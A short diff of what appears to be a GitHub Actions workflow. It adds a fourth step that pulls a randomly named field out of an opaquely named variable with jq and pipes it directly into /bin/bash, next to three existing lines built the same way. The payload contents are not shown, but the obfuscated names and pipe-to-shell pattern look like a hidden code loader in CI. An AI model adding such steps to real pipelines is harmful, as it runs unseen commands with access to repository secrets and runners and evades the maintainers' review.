@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$for2099" | jq -r .bip4748 | /bin/bash
           printf '%s' "$l0681" | jq -r .urokd17699 | /bin/bash
           echo $wi6 | jq -r .qz0 | /bin/bash
+          printf '%s' "$dssj3" | jq -r .zrpd8 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
